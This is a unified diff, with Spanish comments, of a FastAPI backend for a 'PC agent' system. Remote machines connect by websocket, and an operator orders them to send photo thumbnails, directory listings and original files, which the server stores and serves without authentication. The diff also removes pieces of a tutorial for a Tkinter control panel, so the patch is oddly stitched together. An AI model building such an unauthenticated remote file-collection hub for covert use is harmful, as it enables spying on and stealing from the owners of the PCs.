@@ -1,101 +1,129 @@
-# ... (imports y configuración se quedan igual)
+import base64
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import HTMLResponse
+from pydantic import BaseModel
+from typing import List, Dict, Any
+from urllib.parse import unquote
 
-# --- "BASE DE DATOS" EN MEMORIA SEPARADA ---
-# ... (connected_agents se queda igual)
-gallery_cache: Dict[str, Dict[str, Any]] = {}
-gallery_status: Dict[str, str] = {}
+app = FastAPI(title="Agente PC - Backend (Explorador Total)")
+app.add_middleware(
+    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
+)
+
+# --- MODELOS DE DATOS ---
+class Command(BaseModel):
+    target_id: str; action: str; payload: str = ""
+class Thumbnail(BaseModel):
+    filename: str; filepath: str; small_thumb_b64: str
+class ThumbnailChunk(BaseModel):
+    thumbnails: List[Thumbnail]; is_final_chunk: bool
+class FileSystemItem(BaseModel):
+    name: str; type: str; path: str
+class DirectoryListingChunk(BaseModel):
+    path: str; items: List[FileSystemItem]; is_final_chunk: bool
+
+# --- "BASE DE DATOS" EN MEMORIA ---
+connected_agents: Dict[str, Dict[str, Any]] = {}
+device_media_cache: Dict[str, Dict[str, Any]] = {}
+fetch_status: Dict[str, str] = {}
 explorer_cache: Dict[str, List[Dict[str, str]]] = {}
 explorer_status: Dict[str, str] = {}
 
-# ... (El resto de los modelos de datos se queda igual)
-
 # --- ENDPOINTS ---
-# ... (@app.websocket y @app.get("/api/get-agents") se quedan igual)
+@app.get("/")
+async def root(): return {"message": "Servidor del Agente de PC activo."}
+
+@app.websocket("/ws/{device_id}/{device_name:path}")
+async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
+    device_name_decoded = unquote(device_name); await websocket.accept()
+    print(f"[PC-AGENT] Conectado: '{device_name_decoded}'")
+    connected_agents[device_id] = {"ws": websocket, "name": device_name_decoded}
+    try:
+        while True: await websocket.receive_text()
+    except WebSocketDisconnect:
+        print(f"[PC-AGENT] Desconectado: '{connected_agents.get(device_id, {}).get('name')}'")
+        if device_id in connected_agents: del connected_agents[device_id]
+        if device_id in device_media_cache: del device_media_cache[device_id]
+        if device_id in fetch_status: del fetch_status[device_id]
+        if device_id in explorer_cache: del explorer_cache[device_id]
+        if device_id in explorer_status: del explorer_status[device_id]
+
+@app.get("/api/get-agents")
+async def get_agents():
+    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]
 
 @app.post("/api/send-command")
 async def send_command_to_agent(command: Command):
-    # ...
-    if command.action == "get_thumbnails": # Limpia la caché de la galería
-        gallery_cache[command.target_id] = {}; gallery_status[command.target_id] = "loading"
-    if command.action == "list_directory": # Limpia la caché del explorador
+    agent = connected_agents.get(command.target_id)
+    if not agent: return {"status": "error", "message": "Agente no conectado"}
+    if command.action == "get_thumbnails":
+        device_media_cache[command.target_id] = {}; fetch_status[command.target_id] = "loading"
+    if command.action == "list_directory":
         explorer_cache[command.target_id] = []; explorer_status[command.target_id] = "loading"
-    # ...
+    try:
+        await agent["ws"].send_text(command.json())
+        return {"status": "success", "message": "Comando enviado"}
+    except Exception as e: return {"status": "error", "message": str(e)}
 
 @app.post("/api/submit_media_chunk/{device_id}")
 async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
-    # Esta ruta ahora es SOLO para la galería
-    # ... (guarda los datos en gallery_cache y actualiza gallery_status)
+    if device_id not in device_media_cache: device_media_cache[device_id] = {}
+    for thumb in chunk.thumbnails:
+        device_media_cache[device_id][thumb.filename] = thumb.dict()
+    if chunk.is_final_chunk: fetch_status[device_id] = "complete"
+    return {"status": "chunk received"}
 
-# --- ¡NUEVAS RUTAS PARA EL EXPLORADOR! ---
 @app.post("/api/submit_directory_listing/{device_id}")
-# ... (recibe el listado de archivos y lo guarda en explorer_cache)
+async def submit_directory_listing(device_id: str, chunk: DirectoryListingChunk):
+    if device_id not in explorer_cache: explorer_cache[device_id] = []
+    explorer_cache[device_id].extend([item.dict() for item in chunk.items])
+    if chunk.is_final_chunk: explorer_status[device_id] = "complete"
+    return {"status": "listing chunk received"}
 
 @app.get("/api/get_directory_listing/{device_id}")
-# ... (devuelve los datos de explorer_cache y explorer_status)```
+async def get_directory_listing(device_id: str):
+    status = explorer_status.get(device_id, "complete")
+    items = explorer_cache.get(device_id, [])
+    return {"status": status, "items": items}
 
-#### ✅ 3. Panel de Control: `PanelControlPc.py` (con la Interfaz de Pestañas Correcta)
-
-Este es el cambio más visible.
-
-**Reemplaza todo el contenido de tu `PanelControlPc.py` con esta versión final.**
-```python
-# ... (imports y configuración se quedan igual)
-
-class ControlPanelPCApp(tk.Tk):
-    # ... (__init__ se queda igual, con la lista de iconos)
-
-    def create_widgets(self):
-        # ... (Panel izquierdo se queda igual)
-        
-        # --- Comandos con los botones separados ---
-        command_frame = ttk.LabelFrame(left_frame, text="Comandos", padding=10)
-        command_frame.pack(fill=tk.X, pady=(10,0), side=tk.BOTTOM)
-        ttk.Button(command_frame, text="Visualizar Galería", command=self.visualize_gallery).pack(fill=tk.X, pady=2)
-        ttk.Button(command_frame, text="Explorar Disco C:", command=lambda: self.explore_path("C:\\")).pack(fill=tk.X, pady=2)
-        self.open_file_button = ttk.Button(command_frame, text="Abrir Archivo (Explorador)", command=self.open_selected_explorer_file, state=tk.DISABLED)
-        self.open_file_button.pack(fill=tk.X, pady=2)
-        # ... (botones de pausa/continuar)
-
-        # --- PANEL DERECHO CON PESTAÑAS ---
-        right_frame = ttk.Frame(main_paned); main_paned.add(right_frame, weight=3)
-        self.notebook = ttk.Notebook(right_frame); self.notebook.pack(fill=tk.BOTH, expand=True)
-
-        # --- Pestaña 1: Galería Rápida ---
-        gallery_tab = ttk.Frame(self.notebook, padding=5); self.notebook.add(gallery_tab, text="Galería Rápida")
-        # ... (Aquí va la configuración del canvas para la galería y los filtros)
-        
-        # --- Pestaña 2: Explorador de Archivos ---
-        explorer_tab = ttk.Frame(self.notebook, padding=5); self.notebook.add(explorer_tab, text="Explorador de Archivos")
-        # ... (Aquí va la configuración del Treeview para el explorador)
-
-    def visualize_gallery(self):
-        """Activa la pestaña de Galería y pide las miniaturas."""
-        self.notebook.select(0)
-        selected_id = self.get_selected_agent_id();
-        if not selected_id: return
-        # ... (Llama a la lógica de polling para la galería)
-
-    def explore_path(self, path):
-        """Activa la pestaña de Explorador y pide el listado de una ruta."""
-        self.notebook.select(1)
-        selected_id = self.get_selected_agent_id();
-        if not selected_id: return
-        # ... (Llama a la lógica de polling para el explorador)
-
-    def fetch_and_display_thumbnails(self, device_id, attempts=60):
-        """Función de polling SOLO para la galería."""
-        # ... (Pide a /api/get_media_list y llama a display_thumbnails)
-
-    def fetch_directory_listing(self, device_id, path, attempts=15):
-        """NUEVA función de polling SOLO para el explorador."""
-        # ... (Pide a /api/get_directory_listing y llama a display_directory_listing)
+@app.post("/api/upload_original_file/{device_id}/{filename:path}")
+async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
+    decoded_filename = unquote(filename)
+    # Creamos la entrada en la caché si no existe (importante para el explorador)
+    if device_id not in device_media_cache: device_media_cache[device_id] = {}
+    if decoded_filename not in device_media_cache[device_id]:
+        device_media_cache[device_id][decoded_filename] = {}
     
-    def display_thumbnails(self, media_list_dict, device_id):
-        """Dibuja la cuadrícula en la pestaña de Galería."""
-        # ...
+    file_bytes = await file.read()
+    original_b64 = base64.b64encode(file_bytes).decode('utf-8')
+    device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
+    print(f"Recibido archivo original '{decoded_filename}' de {device_id[:8]}.")
+    return {"status": "success"}
 
-    def display_directory_listing(self, listing_data, path):
-        """Rellena el árbol de archivos en la pestaña de Explorador."""
-        # ...
+@app.get("/api/get_media_list/{device_id}")
+async def get_media_list(device_id: str):
+    status = fetch_status.get(device_id, "complete")
+    thumbnails = device_media_cache.get(device_id, {})
+    return {"status": status, "thumbnails": thumbnails}
 
-    # ... (El resto de las funciones de ayuda)
+@app.get("/media/{device_id}/{filename:path}")
+async def get_large_media(device_id: str, filename: str):
+    decoded_filename = unquote(filename)
+    cache = device_media_cache.get(device_id, {})
+    media_item = cache.get(decoded_filename)
+    if not media_item or 'original_b64' not in media_item:
+        return Response(content='{"detail":"Archivo original no disponible"}', status_code=404)
+    try:
+        file_bytes = base64.b64decode(media_item['original_b64'])
+        media_type = "application/octet-stream"
+        fn_lower = decoded_filename.lower()
+        if fn_lower.endswith(('.jpg', '.jpeg')): media_type = "image/jpeg"
+        elif fn_lower.endswith('.png'): media_type = "image/png"
+        elif fn_lower.endswith('.mp4'): media_type = "video/mp4"
+        elif fn_lower.endswith('.txt'): media_type = "text/plain"
+        elif fn_lower.endswith('.pdf'): media_type = "application/pdf"
+        elif fn_lower.endswith(('.doc', '.docx')): media_type = "application/msword"
+        return Response(content=file_bytes, media_type=media_type)
+    except Exception as e:
+        return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500)
